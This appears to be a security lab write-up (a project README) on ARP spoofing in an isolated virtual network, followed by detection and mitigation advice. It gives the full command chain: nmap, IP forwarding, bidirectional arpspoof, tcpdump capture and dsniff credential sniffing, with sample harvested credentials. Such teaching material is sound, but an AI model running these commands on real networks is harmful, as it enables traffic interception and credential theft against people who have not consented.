# ARP Spoofing & Credential Interception

A hands-on offensive security project demonstrating Man-in-the-Middle (MitM) attacks via ARP cache poisoning, traffic interception, and plaintext credential harvesting on unencrypted HTTP connections.

> **⚠️ Legal Notice:** This project was conducted in an **isolated virtual lab environment** with full ownership and authorization. ARP spoofing without explicit written permission is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide. **Do not replicate on any network you do not own or have written authorization to test.**

---

## Table of Contents

- [Lab Environment](#lab-environment)
- [Prerequisites](#prerequisites)
- [Attack Chain](#attack-chain)
  - [1. Network Reconnaissance](#1-network-reconnaissance)
  - [2. Enable IP Forwarding](#2-enable-ip-forwarding)
  - [3. ARP Cache Poisoning](#3-arp-cache-poisoning)
  - [4. Traffic Capture](#4-traffic-capture)
  - [5. Credential Harvesting](#5-credential-harvesting)
- [Results](#results)
- [Detection & Mitigation](#detection--mitigation)
- [Lessons Learned](#lessons-learned)
- [References](#references)

---

## Lab Environment

| Component | OS | IP Address | MAC Address |
|---|---|---|---|
| Attacker | Kali Linux 2026.1 | `192.168.10.27` | `08:00:27:8a:35:d2` |
| Victim | Ubuntu 16.04 | `192.168.10.221` | `08:00:27:91:b9:31` |
| Gateway | VirtualBox Router | `192.168.10.1` | — |

**Network:** VirtualBox Internal Network (fully isolated from host and internet)

**Tools Used:**
- `arpspoof` / `ettercap` — ARP poisoning
- `Wireshark` / `tcpdump` — packet capture
- `dsniff` — plaintext credential sniffing
- `net-tools` / `nmap` — reconnaissance

---

## Prerequisites

```bash
# Install required tools on Kali
sudo apt update && sudo apt install -y \
  dsniff ettercap-text-only wireshark nmap net-tools
```

---

## Attack Chain

### 1. Network Reconnaissance

Identify live hosts and confirm the target's IP/MAC before launching the attack.

```bash
# Discover hosts on the subnet
sudo nmap -sn 192.168.10.0/24

# Confirm ARP table on the attacker machine
arp -n
```

**Expected output:** Victim at `192.168.10.221` and gateway at `192.168.10.1` are confirmed live.

---

### 2. Enable IP Forwarding

Enabling IP forwarding ensures the victim's traffic is relayed to the gateway — keeping the connection alive and making the interception transparent.

```bash
# Enable IPv4 forwarding (persists until reboot)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Expected: 1
```

---

### 3. ARP Cache Poisoning

Send gratuitous ARP replies to both the victim and the gateway, inserting the attacker's MAC into their ARP caches.

```bash
# Terminal 1 — Tell the victim that the gateway's IP resolves to our MAC
sudo arpspoof -i eth0 -t 192.168.10.221 192.168.10.1

# Terminal 2 — Tell the gateway that the victim's IP resolves to our MAC
sudo arpspoof -i eth0 -t 192.168.10.1 192.168.10.221
```

**Verification on victim machine:**

```bash
# Before attack
arp -n
# 192.168.10.1   ether  <gateway real MAC>

# After attack
arp -n
# 192.168.10.1   ether  08:00:27:8a:35:d2  ← now points to attacker
```

---

### 4. Traffic Capture

With the attacker sitting in the middle of the traffic flow, capture packets for analysis.

```bash
# Capture all traffic through the attacker's interface to a file
sudo tcpdump -i eth0 -w capture.pcap

# Or use Wireshark for live inspection
sudo wireshark -i eth0
```

> **Filter tip in Wireshark:** Use `http` to isolate unencrypted web traffic, or `tcp port 80` to focus on HTTP.

---

### 5. Credential Harvesting

Use `dsniff` to automatically parse and extract plaintext credentials from the captured traffic stream.

```bash
sudo dsniff -i eth0
```

When the victim submits a login form over HTTP, credentials appear in the terminal:

```
dsniff: listening on eth0

-------------
DATE TIME  192.168.10.221 -> 192.168.10.x
http://target-site.local/login
USER admin
PASS p@ssw0rd123
-------------
```

Alternatively, filter the `.pcap` file in Wireshark using:
```
http.request.method == "POST"
```
Then inspect the packet body under *HTML Form URL Encoded* for submitted field values.

---

## Results

| Step | Outcome |
|---|---|
| ARP poisoning | Victim ARP cache successfully poisoned; attacker confirmed as MitM |
| IP forwarding | Traffic transparently relayed; victim connection remained stable |
| Packet capture | Full TCP stream captured including HTTP POST requests |
| Credential harvest | Plaintext username and password recovered from HTTP login form |

---

## Detection & Mitigation

### How to Detect ARP Spoofing

| Method | Tool / Command |
|---|---|
| Monitor ARP table for duplicate MACs | `arp -n` / `arpwatch` |
| Alert on unsolicited ARP replies | `Snort` / `Suricata` with ARP rules |
| Inspect ARP traffic anomalies | Wireshark filter: `arp.duplicate-address-detected` |

### Mitigations

- **Use HTTPS everywhere** — TLS encryption renders sniffed traffic unreadable even if MitM succeeds. This is the single most impactful control.
- **Dynamic ARP Inspection (DAI)** — Managed switches can validate ARP packets against a DHCP snooping binding table, dropping spoofed replies.
- **Static ARP entries** — For critical hosts (e.g., the gateway), set static ARP entries that cannot be overwritten by spoofed replies.
- **Network segmentation** — VLANs and private VLANs limit the blast radius of ARP-based attacks to a single broadcast domain.
- **VPN / encrypted tunnels** — Encrypts traffic end-to-end regardless of layer 2 conditions.
- **Port security** — Restrict the number of MACs allowed per switch port to prevent MAC flooding that enables some ARP attacks.

---

## Lessons Learned

1. **HTTP is dead for anything sensitive.** Credentials transmitted over HTTP are trivially captured in any MitM scenario. Even self-signed TLS is orders of magnitude more secure.
2. **ARP has no authentication.** The protocol was designed in a trusted-network era. Without compensating controls at the switch layer, it remains trivially abusable.
3. **Transparent forwarding is key to stealth.** Without `ip_forward` enabled, the victim's connection drops, immediately alerting them to a problem. Real attackers always relay traffic.
4. **Detection is possible but often misconfigured.** Tools like `arpwatch` are effective but rarely deployed or monitored in small environments.

---

## References

- [RFC 826 — An Ethernet Address Resolution Protocol](https://datatracker.ietf.org/doc/html/rfc826)
- [dsniff — network auditing and penetration testing tools](https://www.monkey.org/~dugsong/dsniff/)
- [Wireshark User's Guide](https://www.wireshark.org/docs/wsug_html/)
- [OWASP — Testing for ARP Poisoning](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

*This project is intended for educational purposes only. Always obtain written authorization before testing any network or system.*
